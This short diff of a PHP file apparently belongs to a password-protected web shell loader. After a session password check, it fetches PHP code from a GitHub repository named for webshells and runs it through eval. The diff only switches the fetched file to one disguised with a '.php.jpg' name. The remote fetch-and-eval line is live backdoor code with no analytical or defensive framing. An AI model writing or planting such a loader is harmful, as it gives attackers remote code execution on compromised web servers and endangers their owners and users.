@@ -11,5 +11,5 @@ if (!isset($_SESSION[md5($password)])) {
         exit;
     }
 }
-$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/min2');
+$sa = file_get_contents('https://raw.githubusercontent.com/exploit-haxor/webshell/main/bypas.php.jpg');
 eval('?>'.$sa);
